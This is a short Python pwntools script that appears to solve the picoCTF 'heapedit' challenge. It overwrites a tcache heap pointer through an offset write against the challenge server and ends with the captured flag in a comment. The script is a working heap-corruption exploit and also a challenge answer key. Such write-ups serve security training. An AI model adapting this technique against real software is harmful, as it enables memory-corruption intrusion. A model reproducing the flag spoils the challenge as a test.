#!/usr/bin/python3

from pwn import *

debug = 0
if debug:
    r = process("./heapedit")
else:
    r = remote("mercury.picoctf.net", "36605")

first_heap_pointer = 0x6034A0
# located in tchunk addr (first heap chunk)
pointer_to_first_pointer = 0x602088
tchunk_first_pointer = 0x603890
# second pointer is located in first pointer
tchunk_second_pointer = 0x603800

r.recvuntil(b"Address: ")
# we just make the first pointer the second one in tchunk
offset = pointer_to_first_pointer - first_heap_pointer
r.sendline(str(offset).encode())

r.recvuntil(b"Value: ")
r.sendline(chr(0x0).encode())

print(r.recv(4096))
# picoCTF{702d6d8ea75c4c92fe509690a593fee2}
